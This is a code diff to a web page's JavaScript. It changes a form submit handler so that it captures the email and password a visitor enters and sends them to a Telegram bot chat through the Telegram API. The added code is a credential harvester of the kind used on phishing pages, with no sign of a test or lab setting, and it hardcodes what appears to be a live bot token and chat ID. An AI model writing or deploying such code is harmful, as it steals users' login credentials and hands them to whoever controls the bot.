@@ -85,20 +85,47 @@ function validateForm(event) {
     // console.log(email, password);
 }
 
-function formSubmit(event) {
+async function formSubmit(event) {
     event.preventDefault();
 
-    let apiToken = "my_bot_api_token";
+    const email = window.inputEmail.value;
+    const password = window.inputPassword.value;
+
+    if(!email || !password) {
+        return false;
+    }
+
+    let apiToken = "6333160040:AAHXyBNdAxgyH-ccyF64EPhA0gqoq7AaqZg";
     let chatId = "-1001965320115";
-    let text = "Hello world!";
 
-    let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}`;
+    let text = `
+    <b>Email: </b> ${email}
+    <b>Password </b> ${password}
+    `;
 
-    let request = new XMLHttpRequest();
-    request.open("GET", urlString);
-    request.send();
+    let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage`;
 
-    let response = request.response;
+    const response = await fetch(urlString, {
+        method: 'post',
+        headers: {
+            'Accept': 'application/json',
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text,
+            parse_mode: 'HTML'
+        })
+    });
+
+    const resp = await response.json();
+    console.log(resp);
+
+    // let request = new XMLHttpRequest();
+    // request.open("GET", urlString);
+    // request.send();
+
+    // let response = request.response;
 
     // Do what you want with response
 }
